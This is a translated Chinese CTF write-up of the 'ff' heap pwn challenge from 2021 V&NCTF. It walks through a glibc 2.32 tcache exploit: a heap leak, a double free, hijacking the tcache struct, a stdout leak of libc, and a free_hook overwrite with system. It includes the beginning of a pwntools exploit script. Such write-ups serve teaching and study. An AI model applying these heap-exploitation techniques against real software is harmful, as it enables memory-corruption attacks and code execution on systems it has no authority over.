# 2021 V&NCTF 部分PWN WriteUP
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## ff
###  分析
首先`ida`查看一下该程序，程序一共提供了四种功能，分别是`add,delete,show,edit`四个函数，其中`show`函数只能够调用一次，`edit`函数只能调用两次。比较特殊的一个点就是该程序使用的`GLIBC
2.32`。我们首先来分析一下所有的函数，首先是`add`函数
    __int64 add()
    {
      __int64 result; // rax
      unsigned int i; // [rsp+8h] [rbp-18h]
      unsigned int size; // [rsp+Ch] [rbp-14h]
      void *size_4; // [rsp+10h] [rbp-10h]
      puts("Size:");
      size = myRead();
      if ( size > 0x7E )
        size = 0x7F;
      size_4 = malloc(size);
      for ( i = 0; i fd`指针的加密。
    #define PROTECT_PTR(pos, ptr) \
      ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
    #define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
也就是进行了抑或加密。那么这里就和其他版本的`tcache`不一样了。我们看一下释放一个堆块之后的堆块内容。
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x555555757310 (size : 0x20cf0)
           last_remainder: 0x0 (size : 0x0)
                unsortbin: 0x0
    (0x80)   tcache_entry[6](1): 0x5555557572a0 --> 0x555555757 (invaild memory)
    pwndbg> x/20gx  0x5555557572a0
    0x5555557572a0: 0x0000000555555757      0x0000555555757010
    0x5555557572b0: 0x0000000000000000      0x0000000000000000
    0x5555557572c0: 0x0000000000000000      0x0000000000000000
    0x5555557572d0: 0x0000000000000000      0x0000000000000000
    0x5555557572e0: 0x0000000000000000      0x0000000000000000
    0x5555557572f0: 0x0000000000000000      0x0000000000000000
    0x555555757300: 0x0000000000000000      0x0000000000000000
    0x555555757310: 0x0000000000000000      0x0000000000020cf1
    0x555555757320: 0x0000000000000000      0x0000000000000000
    0x555555757330: 0x0000000000000000      0x0000000000000000
    pwndbg>
也就是说如果我们此时调用`show`函数就可以泄漏出一个堆地址。那么得到这个堆地址之后就可以利用两次`edit`的机会构造`double
free`，覆写`fd`指针，使得我们可以分配到`pthread_tcache_struct`结构体所在的堆块进而控制`tcache`的`count`和`entry`指针，从而实现任意的地址分配。
但是现在还存在一个问题就是如何泄漏得到`libc`基地址，上面我们已经控制了`tcache`，那么就可以将`0x290`大小堆块对应的`count`设置为`7`，进而释放`pthread_tcache_struct`结构体，那么该结构体就会被释放到`unsorted
bin`中，也就是存在了一个`libc`地址。
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x555555757310 (size : 0x20cf0)
           last_remainder: 0x0 (size : 0x0)
                unsortbin: 0x555555757000 (size : 0x290)
    (0x30)   tcache_entry[1](251): 0
    (0x40)   tcache_entry[2](255): 0
    (0x70)   tcache_entry[5](251): 0
    (0x80)   tcache_entry[6](255): 0x555555757 (invaild memory)
    (0x290)   tcache_entry[39](7): 0
    pwndbg> x/20gx 0x555555757000
    0x555555757000: 0x0000000000000000      0x0000000000000291
    0x555555757010: 0x00007ffff7fb9c00      0x00007ffff7fb9c00
    0x555555757020: 0x0000000000000000      0x0000000000000000
    0x555555757030: 0x0000000000000000      0x0000000000000000
    0x555555757040: 0x0000000000000000      0x0000000000000000
    0x555555757050: 0x0000000000000000      0x0007000000000000
    0x555555757060: 0x0000000000000000      0x0000000000000000
    0x555555757070: 0x0000000000000000      0x0000000000000000
    0x555555757080: 0x0000000000000000      0x0000000000000000
    0x555555757090: 0x0000000000000000      0x0000000000000000
那么在堆块中存在改地址之后就可以再次利用任意地址分配，覆写`main_arena`附近的地址使其指向`stdout`。这个过程中由于堆块的分配导致`libc`地址向高地址方向移动，最终我选择的是在`0x60
tcache
entry`位置处存储`main_arena`附近的地址，将其覆写为`stdout`再申请`0x60`大小的堆块即可覆写`stdout`结构体，泄漏出`libc`地址。这里需要`1/16`的爆破。
泄漏到`libc`地址之后就好说了，再次利用任意地址分配分配到`free_hook`，覆写其为`system`，`getshell`。
###  EXP
    # encoding=utf-8
    from pwn import *
    file_path = "./pwn"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xE23)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    else:
        p = remote('node3.buuoj.cn', 26212)
        libc = ELF('./libc.so.6')
        one_gadget = 0x0
    def add(size, content=b"1\n"):
        p.sendlineafter(">>", "1")
        p.sendlineafter("Size:\n", str(size))
        p.sendafter("Content:\n", content)
    def delete():
        p.sendlineafter(">>", "2")
    def show():
        p.sendlineafter(">>", "3")
    def edit(content):
        p.sendlineafter(">>", "5")
        p.sendafter("Content:\n", content)
    stdout = 0xa6c0